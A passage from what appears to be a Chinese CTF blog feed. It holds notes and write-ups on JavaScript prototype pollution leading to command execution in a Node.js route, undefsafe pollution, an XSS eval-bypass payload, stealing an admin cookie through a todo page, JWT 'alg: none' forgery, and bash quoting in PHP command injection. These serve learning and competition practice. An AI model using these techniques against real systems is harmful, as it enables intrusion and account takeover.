&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/status&#x27;</span>)    <span class="comment">// 漏洞点，只要将字典 commands 给污染了, 就能任意执行我们的命令</span></span><br><span class="line">    .<span class="title function_">get</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">&quot;script-1&quot;</span>: <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line">            <span class="string">&quot;script-2&quot;</span>: <span class="string">&quot;free -m&quot;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            <span class="title function_">exec</span>(commands[index], &#123;<span class="attr">shell</span>:<span class="string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);    <span class="comment">// 将命令执行结果输出</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;OK&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Sorry cant find that!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err.<span class="property">stack</span>);</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;Something broke!&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><h2 id="为什么不是write-note"><a href="#为什么不是write-note" class="headerlink" title="*为什么不是write_note?"></a>*为什么不是write_note?</h2><ol><li>这里不行，就算传入<code>__proto__</code>也无法污染原型链，而是直接替换对象，只有在<code>undefsafe()</code>中才可以添加属性进行污染</li></ol><h2 id="undefsafe的原型链污染"><a href="#undefsafe的原型链污染" class="headerlink" title="*undefsafe的原型链污染"></a>*undefsafe的原型链污染</h2><ol><li>介绍：Undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞，攻击者可利用该漏洞添加或修改 Object.prototype 属性</li><li>速记<ol><li>低版本&lt;2.0.3</li><li>undefsafe用来修改&#x2F;添加属性时防止报错</li><li>2.0.3一下如果当属性不存在时，我们想对该属性赋值，访问属性会在上层进行创建并赋值</li></ol></li><li><a href="https://www.anquanke.com/post/id/242645">例子</a></li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>直接见script notes_wangding20</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> proto pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss_payload</title>
      <link href="/2024/10/30/xss_payload/"/>
      <url>/2024/10/30/xss_payload/</url>
      
        <content type="html"><![CDATA[<ol><li>执行代码<code>window[&#39;eval&#39;](atob(data))</code><ol><li>绕过安全检查：有些网站或应用可能会禁用或重写 eval 函数以防止潜在的安全风险。通过使用 <code>window[&#39;eval&#39;]</code>，攻击者可以尝试绕过这种检查</li><li>使用<code>atob(data)</code>进行base64解码</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web02_wangding24</title>
      <link href="/2024/10/29/web02_wangding24/"/>
      <url>/2024/10/29/web02_wangding24/</url>
      
        <content type="html"><![CDATA[<blockquote><p>也是更新我对带外的思考了</p></blockquote><h2 id="越权与带外"><a href="#越权与带外" class="headerlink" title="越权与带外"></a>越权与带外</h2><blockquote><p>没见过这种，开辟新思路了，还是做题不够多</p></blockquote><ol><li>没搞出来，dy牛，分析一下</li><li>第一波的&#x2F;flag纯靠经验猜，砂岩了，不过就算有也想不到这样</li><li>一眼注入回显型，xss和ssti，xss有点希望(boss会看，可以获取他的cookie)，但是bp collaborator和dnslog都不行，应该是不出网，不出网如何获取信息？而且这里&#x2F;flag有访问控制</li><li><em><strong>这里就来到今天的重点了</strong></em><ol><li>引入一个<strong>信道概念</strong>，从本质上看与网站交互的信道是单条的，带外是为了自己引进，如果带外不行的话，那如何在单条信道获取信息 -&gt; 对方返回的内容，这里最明显的就是todo，接下来就是要让对方携带cookie返回在todo里面</li><li><strong>访问控制</strong>: todo可以通过post进行修改，而且注意到每一个content都有一个对于的id -&gt; 通过boss可以访问到&#x2F;flag，然后插入到我的页面</li><li>payload: web02_js&#x2F;py_wangding24</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS原型链污染速通</title>
      <link href="/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/"/>
      <url>/2024/10/28/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/</url>
      
        <content type="html"><![CDATA[<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="1-DONE-Js中函数也是对象啊，他们的原型链怎么办"><a href="#1-DONE-Js中函数也是对象啊，他们的原型链怎么办" class="headerlink" title="1. DONE: Js中函数也是对象啊，他们的原型链怎么办?"></a>1. DONE: Js中函数也是对象啊，他们的原型链怎么办?</h3><ol><li>对于构造函数，更加准确是使用new调用时，func.prototype才能发挥他特有的作用，否则只是一个普通的属性</li><li><code>Constructor.prototype</code> 仅在构造实例时有用。它与 <code>Constructor.[[Prototype]]</code> 无关，后者是构造函数的自有原型，即 Function.prototype。也就是说，Object.getPrototypeOf(Constructor) &#x3D;&#x3D;&#x3D; Function.prototype</li></ol><h3 id="2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事"><a href="#2-DONE-内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事" class="headerlink" title="*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?"></a>*2. DONE: 内置对象的原型链是指定的吗，外置对象总是默认某一个吗，Object又是怎么一回事?</h3><ol><li><p>默认情况下，构造函数的 prototype 是一个普通的对象，它的<code>[[Prototype]]</code>指向 Object.prototype</p><ol><li>普通对象的 <code>[[Prototype]]</code> 指向 Object.prototype。这是 JavaScript 中原型链机制的一个基本特性。每个通过<em><strong>对象字面量</strong></em>或***new Object()***创建的对象，默认情况下其内部 <code>[[Prototype]]</code>链接（即 <code>__proto__</code>）指向 Object.prototype</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的调用链</span></span><br><span class="line">obj ---&gt; <span class="title class_">Constructor</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> ---&gt; <span class="literal">null</span></span><br><span class="line"><span class="comment">// 可以通过调用链进行解决</span></span><br></pre></td></tr></table></figure></li><li><p>内置构造函数</p><ol><li>一些内置构造函数的 prototype 属性本身就是其自身的实例。例如，Number.prototype 是数字 0，Array.prototype 是一个空数组，RegExp.prototype 是 <code>/(?:)/</code></li><li>唯一的例外是 Object.prototype 本身，它的 <code>[[Prototype]]</code> 是 null</li></ol></li></ol><h3 id="3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗"><a href="#3-DONE-原型指向的对象对于每一个自定义对象都是不同的吗" class="headerlink" title="*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?"></a>*3. DONE: 原型指向的对象对于每一个自定义对象都是不同的吗?</h3><ol><li>构造函数中prototype总是会默认有一个同对象，当你改变构造函数的 prototype 属性后，之前创建的实例和之后创建的实例将有不同的 <code>[[Prototype]]</code>。这是因为每个实例对象的 <code>[[Prototype]]</code> 在创建时就已经被设置，并且不会随着构造函数 prototype 属性的变化而变化</li><li>通过同一个构造函数构造的对象的 <code>[[Prototype]]</code> 是同一个对象。所有通过同一个构造函数创建的实例共享同一个原型对象，但是修改(这里的修改不是说添加而是指向另一个对象，<strong>地址不同</strong>)不是“同步”进行的，指向了不同的对象 -&gt; 原来的对象还可以访问，垃圾收集器不会处理</li></ol><h2 id="Js原型链基础"><a href="#Js原型链基础" class="headerlink" title="Js原型链基础"></a>Js原型链基础</h2><h3 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h3><ol><li>getter和setter<ol><li>一种语法：通过调用属性的方法来隐式调用一组函数</li><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Working_with_objects#%E5%AE%9A%E4%B9%89_getter_%E4%B8%8E_setter">mdn getter和setter</a></li></ol></li><li>js原型链<ol><li>详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">还是mdn，绝了，web手必备</a></li><li>!!! Notice 流程详见<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E6%A3%80%E6%9F%A5%E5%8E%9F%E5%9E%8B%EF%BC%9A%E6%9B%B4%E6%B7%B1%E5%85%A5%E7%9A%84%E7%A0%94%E7%A9%B6">有创建一个原型的详细流程</a></li><li>核心思想：基于对象的链而非类的链；对象方法基于this；<strong>动态实时改变的</strong></li><li>第一次看的时候被混淆的几个点<ol><li><code>someObject.[[Prototype]]</code> 用于标识 someObject 的原型 -&gt; 可以通过 Object.getPrototypeOf() 和 Object.setPrototypeOf() 函数来访问</li><li><strong>设置<code>[[Prototype]]</code></strong>: <code>&#123; __proto__: ... &#125;</code> 语法与 <code>obj.__proto__</code> 访问器不同：前者是标准且未被弃用，后者则是被许多js引擎实现的原型setter和getter(非标准并逐步弃用)<ol><li><code>&#123; __proto__: ... &#125;</code> 是一种对象字面量语法，允许你在创建对象时指定其原型(这里不是getter和setter)。这是 ES5 引入的一个非标准特性，后来在 ES6 中被标准化为一个正式的语言特性</li></ol></li><li><strong>构造函数的.prototype属性</strong>: 构造函数可以**指定(自定义)**一个有特殊含义的属性prototype -&gt; 当你定义一个构造函数时，JavaScript 会自动为这个构造函数创建一个 prototype 对象。这个原型对象默认有一个 constructor 属性，指向构造函数本身<code>Person.prototype.constructor===Person</code><ol><li>有什么用呢？通过构造函数创建的每一个实例都会自动将构造函数的 prototype 属性作为其 <code>[[Prototype]]</code> -&gt; 是自动通过this实现的，特殊情况：如果构造函数返回非原始值而是一个新对象时，则该值将成为 new 表达式的结果。在这种情况下，<code>[[Prototype]]</code> 可能无法正确绑定——但在实践中应该很少发生</li><li><code>obj.constructor</code>:(会通过原型链寻找)的作用在于追踪到构造函数，一些内置操作也会读取 constructor 属性，如果没有设置，它们可能无法按预期工作</li></ol></li></ol></li></ol></li></ol><h3 id="类是构造函数语法糖"><a href="#类是构造函数语法糖" class="headerlink" title="类是构造函数语法糖"></a>类是构造函数语法糖</h3><ol><li>js中的类<ol><li>简单了解：可以暂时理解为类是构造函数的语法糖，这意味着你仍然可以修改 Box.prototype 来改变所有实例的行为</li></ol></li><li>Dive into<ol><li><code>alert(typeof Classname)</code>显示为function</li><li>函数转换示例<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/%E5%87%BD%E6%95%B0%E8%BD%AC%E6%8D%A2.png" alt="理解"><ol><li>转换为对于Classname()函数prototype属性的内容，<code>User.prototype.constrcutor===User</code></li></ol></li><li><a href="https://zh.javascript.info/class">see more in 现代js教程</a></li></ol></li></ol><h2 id="Js原型链污染"><a href="#Js原型链污染" class="headerlink" title="Js原型链污染"></a>Js原型链污染</h2><h3 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h3><ol><li>快速上手<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">离别歌yyds</a></li></ol><h3 id="与问题3进行区分与原理解释"><a href="#与问题3进行区分与原理解释" class="headerlink" title="*与问题3进行区分与原理解释"></a>*与问题3进行区分与原理解释</h3><ol><li><p>在js中对象是通过地址进行区分的，里面的修改是指指向另一个新的对象(新的地址)，而原来的地址已经定下来而且没有被垃圾回收</p></li><li><p>原型链污染可以是建立在指向同一个原型的情况下<strong>添加属性&#x2F;函数</strong>进行污染</p></li><li><p>原型链污染示例</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此例子无法进行原型链污染，只能修改对象的__proto__</span></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;&#125;</span><br><span class="line">   <span class="comment">// 建立后的__proto__指向是本身的[[Prototype]]，改变了[[Prototype]]的指向</span></span><br><span class="line"><span class="keyword">let</span> o2 = &#123;&#125;</span><br><span class="line">o2.<span class="property">a</span>  <span class="comment">// 显示undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是在merge中，则可以通过对原有对象添加属性，直接修改所有prototype那个对象而不是替换指向</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// !!!总的来说，就是只能添加内容，不能整体替换指向，再本质就是要进入到对象中修改(merge中就是)</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="1-普通可控输入的原型链污染"><a href="#1-普通可控输入的原型链污染" class="headerlink" title="1. 普通可控输入的原型链污染"></a>1. 普通可控输入的原型链污染</h3><ol><li><p>示例代码</p><ol><li>污染的深度这里会受到限制，所以漏洞可否利用还要看<strong>原型是否一样</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">matrix[client.<span class="property">input1</span>][client.<span class="property">input2</span>]   </span><br><span class="line"><span class="comment">// 可以传入input1=&quot;__proto__&quot;来实现污染</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-Merge类型的原型链污染"><a href="#2-Merge类型的原型链污染" class="headerlink" title="2. Merge类型的原型链污染"></a>2. Merge类型的原型链污染</h3><ol><li><p>示例代码与前提</p><ol><li>json.parse()的递归不安全merge</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em><strong>为什么要json.parse()?</strong></em>: 在JavaScript中，JSON.parse()函数在处理JSON字符串时，会将JSON对象中的任何键视为任意字符串，包括<code>__proto__</code></p><ol><li>这里的<code>__proto__</code>并非是指向原型的属性，而是一个普通的自有属性(字符串)，可以被<code>getOwnProperties(&quot;__proto__&quot;)</code>和<code>hasOwnProperties(&quot;__proto__&quot;)</code>识别</li><li>过程：<code>__proto__</code> 属性仅仅是一个普通的自有属性，对象在查找属性时会在真正的原型上进行查找，但在执行 clone 函数的过程中，由于该属性名字的特殊性，触发了新对象的原型的修改，最终导致了 prototype pollution</li><li>如果是<em><strong>直接<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>的话</strong></em>，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型</li><li>JSON.parse中的原型链污染<img src="/pic/Js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E9%80%9F%E9%80%9A/JSONparse%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png" alt="Json.parse"><ol><li>详见权威报告，离别歌引用文章中有和<a href="https://xz.aliyun.com/t/2802?time__1311=n4+xni0=G=DQtAK0QD/8WpjrYDOboKbDBnhoD">先知社区</a></li></ol></li></ol></li><li><p>预防</p><ol><li>只需要在merge中加上小小的一段检验后跳过即可</li></ol></li></ol><h3 id="实战指南"><a href="#实战指南" class="headerlink" title="*实战指南"></a>*实战指南</h3><ol><li>有很多相关的函数(递归合并的话)，做题时重要的是思路的方向，然后根据具体的方向去查找更加重要，<em><strong>特征</strong></em><ol><li>merge</li><li>类似js这种没有严格访问控制属性的语言</li></ol></li><li>一些可以实战时查阅的资料<ol><li>火狐收藏夹</li><li>这篇不错<a href="https://xz.aliyun.com/t/12053?time__1311=GqGxR70Qi=itKGN4eeqBInO6Kf27EbD#toc-0">关于Prototype Pollution Attack的二三事</a></li><li>有一些cve<a href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析</a></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> proto pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow_jwt</title>
      <link href="/2024/10/27/ctfshow_jwt/"/>
      <url>/2024/10/27/ctfshow_jwt/</url>
      
        <content type="html"><![CDATA[<h2 id="web345-alg-none"><a href="#web345-alg-none" class="headerlink" title="web345: alg: none"></a>web345: alg: none</h2><ol><li>这里就没有验证，理论来说可以随便改，主要问题在于目标目录端点问题<ol><li>***&#x2F;admin和&#x2F;admin&#x2F;***是不一样的</li></ol></li></ol><h2 id="web346-修改alg-none"><a href="#web346-修改alg-none" class="headerlink" title="web346: 修改alg: none"></a>web346: 修改alg: none</h2><ol><li>这里是修改算法为none，可以解决</li><li><strong>注意签名部分可以删掉</strong>，并且需要将sub变为admin</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从babyfirst-revengev2看bash中的字符串</title>
      <link href="/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
      <url>/2024/10/27/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>bash转义与换行问题<ol><li><a href="https://www.bookstack.cn/read/bash-tutorial/docs-quotation.md">阮一峰 挺好的教程</a></li></ol></li><li>其他参考资料见小部分中的如<code>无引用变量的拓展</code></li></ol><h2 id="php如何处理用户输入的字符串"><a href="#php如何处理用户输入的字符串" class="headerlink" title="php如何处理用户输入的字符串"></a>php如何处理用户输入的字符串</h2><ol><li><p>当处理用户输入的字符串(比如<code>$_GET</code>)并将其传递给系统命令时，PHP 本身不会自动为这些字符串添加引号，只是直接进行添加(什么样就放什么进去)，只有字面量才需要进行(单引号和双引号的考虑)</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="comment">// 输入?cmd=\&#x27;\&quot;&#x27;&quot;都可以正常输出</span></span><br></pre></td></tr></table></figure></li><li><p>对用户输入进行处理</p><ol><li><code>escapeshellarg()</code> 会确保 $user_input 被正确转义并用单引号包裹</li><li>需要转义整个命令字符串而不是单独的参数，可以使用 <code>escapeshellcmd()</code>。这个函数会转义可能被 shell 特别解释的字符，但不会添加引号</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line"><span class="variable">$safe_command</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$user_input</span>);</span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$safe_command</span>);</span><br></pre></td></tr></table></figure></li></ol><h2 id="bash中字符串的转义-无引号和单引号与双引号"><a href="#bash中字符串的转义-无引号和单引号与双引号" class="headerlink" title="bash中字符串的转义(无引号和单引号与双引号)"></a>bash中字符串的转义(无引号和单引号与双引号)</h2><ol><li><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E8%BD%AC%E4%B9%89%E5%8C%BA%E5%88%AB.png" alt="先上图"><ol><li>Bash 只有一种数据类型，就是字符串。不管用户输入什么数据，Bash 都视为字符串</li><li><em><strong>单引号只有一个意外，那就是&#39;</strong></em>: 单引号用于保留字符的字面含义，各种特殊字符在单引号里面，都会变为普通字符，比如星号（*）、美元符号（$）、反斜杠（\）等</li><li><em><strong>双引号</strong></em>: 双引号比单引号宽松，可以保留大部分特殊字符的本来含义，但是三个字符除外：美元符号（$）、反引号（&#96; ）和反斜杠（\）。也就是说，这三个字符在双引号之中，会被 Bash 自动扩展<ol><li>*号等通配符会原样进行输出</li><li>灵活性主要用于变量替换</li><li><strong>可以保持原有格式输出 -&gt; 不加双引号再echo中会丢失，在echo配合重定向中会出事(</strong><img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%BF%9D%E6%8C%81%E6%A0%BC%E5%BC%8F.png" alt="bash中双引号保持格式"></li></ol></li></ol></li><li><em><strong>不使用引号的字符串</strong></em> –&gt; 更加详细要去到<strong>无引用变量的拓展</strong>这个标题处<ol><li>以<code>echo hello world</code>为例<ol><li>先上图<img src="/pic/%E4%BB%8Ebabyfirst-revengev2%E7%9C%8Bbash%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2/bash%E4%B8%AD%E6%B2%A1%E6%9C%89%E5%BC%95%E5%8F%B7%E7%9A%84echo.png" alt="echo字符串图"></li><li>无引号：当你不使用引号时，echo 命令会将每个单词视为一个单独的参数</li><li>双引号：当你使用双引号时，整个字符串被当作一个单一的参数传递给 echo</li></ol></li><li><strong>总结</strong>: 无引号字符串：Bash 会将字符串中的空格作为分隔符，并且会解释特殊字符和通配符 –&gt; 与双引号不同的是<code>cat *.txt</code>会进行通配符匹配，即会解析*</li><li>示例解读</li></ol></li></ol><h2 id="bash中的多行命令-部分"><a href="#bash中的多行命令-部分" class="headerlink" title="bash中的多行命令(部分)"></a>bash中的多行命令(部分)</h2><ol><li><em><strong>引号</strong></em>: 单双引号中的字符串字面量本身就可以多行输入和显示 -&gt; 不需要使用\来进行换行了<ol><li>本质: 换行符变成了普通字符而不能发挥作用</li></ol></li><li><em><strong>反斜杠\</strong></em>: 规则如下<ol><li><p>反斜杠 \ 放在一行的末尾，表示该行的结束不是命令的结束，而是继续到下一行</p><ol><li><strong>要搭配换行符使用才行</strong>: 最后一个反斜杠：如果一行以反斜杠 \ 结束，并且后面没有任何字符（包括空格），那么这个反斜杠会被视为普通字符，而不是续行符；后续有字符但是不是换行符也不会有换行作用</li></ol><blockquote><p>接下来这两个不太确定，ai说的但是实践出来不是<br>反斜杠 \ <strong>后面的所有空格都会被忽略</strong>。这意味着你可以使用多个空格或制表符来格式化代码，而不会影响命令的实际内容<br>如果反斜杠 \ 后面跟着的是注释符号 #，那么<strong>注释部分会被忽略</strong>，但反斜杠仍然会作为续行符</p></blockquote></li><li><p>当使用<code>bash -c</code>执行命令时，反斜杠 \ 也可以作为续行符在脚本文件中，反斜杠 \ 也可以用来将长命令拆分成多行</p></li><li><p>在脚本文件中，反斜杠 \ 也可以用来将长命令拆分多行</p></li></ol></li><li>还有here string和here doc的等其他篇吧，不要跑题太多了</li></ol><h2 id="Back-to-babyfirst-revengev2"><a href="#Back-to-babyfirst-revengev2" class="headerlink" title="Back to babyfirst-revengev2"></a>Back to babyfirst-revengev2</h2><h3 id="我的困惑"><a href="#我的困惑" class="headerlink" title="我的困惑"></a>我的困惑</h3><ol><li>Q: php命令执行会按照传入的command的引号吗，还是在bash层面进行处理</li><li>A: 已知php中底层的执行函数为<code>/bin/sh -c $command</code>(详见<code>phpm命令执行底层原理小记</code>)，<strong>调用链从近到远进行入手</strong><ol><li>Q: 此时与传入的<code>$command</code>有很大的关系，&#x2F;bin&#x2F;sh如何解释无引号字符?</li><li>A: slpit+glob，传入的命令中没有空格<code>$IFS</code>的话就是正常的<ol><li>Q: 那在<code>. _</code>调用脚本如何解释呢</li><li>A: php中直接作为输入导致，<strong>字符已经确定为一个整体</strong>，单引号和双引号只是解析的方式</li></ol></li><li><code>$command</code>是php传入的，php从用户的输入<code>$_GET[&#39;cmd&#39;]</code>处获取信息<ol><li>Q: php中判断是单引号还是双引号字符串<ol><li>从$_GET[]</li><li>用户输入获取的呢</li></ol></li><li>A: 直接作为输入，不管单双引号</li></ol></li></ol></li><li>理解<ol><li>!!! Notice 其实双引号和单引号是<strong>解析字符串的方式</strong>，存储在内部是不管引号的，去想象实际的字符</li><li>包括glob拓展后的列表</li></ol></li></ol><h3 id="无引用变量的拓展"><a href="#无引用变量的拓展" class="headerlink" title="*无引用变量的拓展"></a>*无引用变量的拓展</h3><ol><li>split and glob的概念<ol><li>ref<ol><li><a href="https://unix.stackexchange.com/questions/108963/expansion-of-a-shell-variable-and-effect-of-glob-and-split-on-it">stack exchange ref</a> –&gt; 有例子有概念，很不错</li><li><a href="https://www.gnu.org/software/bash/manual/bash.html#Shell-Parameter-Expansion">gnu 官方文档</a><ol><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Filename-Expansion">拓展</a></li><li><a href="http://www.gnu.org/software/bash/manual/bash.html#Word-Splitting">split</a></li></ol></li><li><em><strong>利用此特性的漏洞利用</strong></em><a href="https://medium.com/@bouss3id.abdelkader/unquoted-bash-variable-security-implications-bypassing-if-condition-in-bash-ctf-write-up-79648dc4e910">利用此特性的漏洞利用</a></li></ol></li><li>split: 在每个空格序列处将值拆分为单独的单词。(根据$IFS，可以更改为在非空格的字符处拆分。)因此，结果不再是一个字符串，而是一个<strong>字符串列表</strong>。如果值只包含空格，则此列表可以为空</li><li>glob: 将列表中的每个元素视为一个文件名模式，即一个glob。如果模式与某些文件匹配，则将其替换为匹配文件名的列表，否则将其保留 –&gt; 会进行glob匹配</li></ol></li><li>无引用变量<ol><li><p><code>cmd $var</code> -&gt; <code>cmd(glob(split($var)))</code>后面是一个列表</p></li><li><p><code>/bin/sh -c $cmd</code>也是按照上述的方式，<code>$IFS</code>中的值很重要</p><ol><li><strong>output $IFS in readable way</strong>: IFS的默认值是由空格、制表符和换行符组成的三个字符串<ol><li><code>echo &quot;$IFS&quot; | cat -et</code>(这里需要加上双引号)才会正常，直接$IFS不太行</li><li><code>echo &quot;$IFS&quot; | xxd</code>可以查看16进制</li></ol></li></ol>  <figure class="highlight 